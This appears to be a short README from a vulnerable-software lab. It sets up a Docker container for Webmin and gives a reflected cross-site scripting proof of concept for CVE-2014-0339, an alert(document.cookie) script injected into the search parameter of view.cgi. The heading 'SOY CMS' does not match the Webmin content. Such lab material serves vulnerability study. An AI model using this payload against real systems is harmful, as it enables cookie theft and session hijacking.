# SOY CMS

## Building information

```console
$ docker build -t webmin ./
$ docker run -d -it --rm --name webmin -p 8080:80 webmin
```

## Vulnerability Details

- CVE-2014-0339
- https://github.com/webmin/webmin/commit/3b6234b511f97d18f4941c618ac594e73d8f7bda

### PoC

`http://localhost:8080/webminlog/view.cgi?id=1&search=e"><script>alert(document.cookie);</script>`
